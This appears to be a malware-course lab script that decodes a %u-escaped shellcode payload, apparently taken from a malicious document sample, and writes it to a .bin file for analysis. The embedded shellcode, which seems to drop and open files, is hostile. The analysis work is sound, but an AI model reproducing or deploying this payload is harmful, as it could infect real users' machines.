#!/usr/bin/python

# script from cs 592, malware, lab19.

def decU16(inbuff):
  """
  Manually perform JavaScript's unescape() function. 
  """
  i=0
  outArr = [ ]
  while i < len(inbuff):
    if inbuff[i] == '"':
        i += 1
    elif inbuff[i] == '%':
      if ((i+6) <= len(inbuff)) and (inbuff[i+1] == 'u'): 
        #it's a 2-byte "unicode" value
        currchar = int(inbuff[i+2:i+4], 16)
        nextchar = int(inbuff[i+4:i+6], 16)
        #switch order for little-endian
        outArr.append(chr(nextchar))
        outArr.append(chr(currchar))
        i += 6
      elif (i+3) <= len(inbuff):
        #it's just a single byte
        currchar = int(inbuff[i+1:i+3], 16) 
        outArr.append(chr(currchar))
        i += 3
    else:
      # nothing to change
      outArr.append(inbuff[i])
      i += 1
  return ''.join(outArr)

payload = "%ue589%uec81%u017c%u0000%u6ee8%u0001%u8e00%u0e4e%u72ec%u"\
"b3fe%u8316%ub5b9%ue678%u8f17%u337b%u8aca%u4f5b%uc703%ua5bf%u0017%uad7c%u7d9b%uac"\
"df%uda08%u1676%ufa65%u1f10%u0a79%ufbe8%ufd97%uec0f%u0397%uf60c%ub922%u5e7c%ue1bb"\
"%u021b%u00c6%u6f00%u0010%u0000%u00a0%u6f00%u00b0%u4e00%u0014%u5600%u8b57%u2474%u"\
"310c%ufcff%uc031%u38ac%u74e0%uc10a%u0dcf%uc701%uefe9%uffff%u89ff%u5ff8%uc25e%u00"\
"04%u8b60%u246c%u8b24%u3c45%u548b%u7805%uea01%u4a8b%u8b18%u205a%ueb01%u2ae3%u8b49"\
"%u8b34%uee01%ue856%uffbb%uffff%u443b%u2824%uec75%u5a8b%u0124%u66eb%u0c8b%u8b4b%u"\
"1c5a%ueb01%u048b%u018b%ue9e8%u0002%u0000%uc031%u4489%u1c24%uc261%u0008%u3156%u64"\
"c0%u408b%u8530%u78c0%u8b0f%u0c40%u708b%uad1c%u408b%ue908%u0005%u0000%ufbe9%uffff"\
"%u5eff%u55c3%ue589%uec83%u6008%u758b%u890c%u8bf7%u1455%u4d8b%uac10%ud030%uc2fe%u"\
"e2aa%u6af8%u6a00%u6a02%u6a04%u6a00%u6803%u0000%u4000%u458b%u5018%u5d8b%uff08%u18"\
"53%u4589%ufffc%u1075%u75ff%u500c%u73ff%ue828%u000d%u0000%u75ff%ufffc%u2c53%u8961"\
"%u5dec%u14c2%u5500%ue589%uc031%u5050%u8d60%ufc75%u7d8d%u8bf8%u1055%u5503%u8bfc%u"\
"1445%u452b%u68fc%u0000%u0000%u5057%uff52%u0c75%u55ff%u8508%u74c0%u8b0b%u0107%u8b"\
"06%u3b16%u1455%ud772%u8961%u5dec%u10c2%u5e00%u7589%u89ec%u89f7%ue8f3%uff42%uffff"\
"%u4589%ub9fc%u000e%u0000%u50ad%u75ff%ue8fc%ufee4%uffff%ue2ab%u68f3%u336c%u0032%u"\
"7368%u6568%u896c%u50e0%u13ff%uad91%u5150%uc9e8%ufffe%uabff%uf631%u5d8b%u81ec%u04"\
"c6%u0000%u8d00%uf845%u5650%u53ff%u3b1c%u3c43%ued75%u7589%u31f8%uffd2%u4473%uff52"\
"%u3053%uc085%u840f%u0131%u0000%u4589%u31f4%u52d2%uff52%u4073%u75ff%ufff8%u2053%u"\
"73ff%uff44%uf475%u75ff%ufff8%u2473%u3ae8%uffff%u31ff%u8dc0%udcbd%ufffe%ub9ff%u00"\
"40%u0000%uabf3%ubd8d%ufedc%uffff%u6857%u0100%u0000%u53ff%u3110%u8dc0%udcbd%ufffe"\
"%uf2ff%u4fae%u7d89%uc7e4%u6607%u6f6f%uc72e%u0447%u7865%u0065%u5d8b%u8dec%udc85%u"\
"fffe%u50ff%u4a68%u0000%uff00%u4473%u75ff%u53f4%u94e8%ufffe%u31ff%u8dc0%u88bd%uff"\
"fe%ub9ff%u0015%u0000%uabf3%u958d%ufe88%uffff%u8d52%u9895%ufffe%u52ff%u5050%u6850"\
"%uffff%uffff%u5050%u8d50%udc85%ufffe%u50ff%u53ff%uff04%uf475%u53ff%u3134%u8bd2%u"\
"ec5d%u73ff%u524c%u53ff%u8530%u74c0%u8974%uf045%ud231%u5252%u73ff%uff48%uf875%u53"\
"ff%uff20%u4c73%u75ff%ufff0%uf875%u73ff%ue824%ufe7d%uffff%u458b%uc7e4%u6200%u7261"\
"%uc72e%u0440%u6470%u0066%u858d%ufedc%uffff%u6a50%u8b4a%uec5d%u73ff%uff4c%uf075%u"\
"e853%ufe03%uffff%uc931%u858d%ufe98%uffff%u00c7%u706f%u6e65%u40c6%u0004%u0568%u00"\
"00%u5100%u8d51%udc85%ufffe%u50ff%u858d%ufe98%uffff%u5150%u53ff%uff38%u0c53%u0068"\
"%u0000%u5000%u53ff%u9008%u9090"

outFile = file('Lab19-03_sc.bin', 'wb') 
outFile.write(decU16(payload)) 
outFile.close()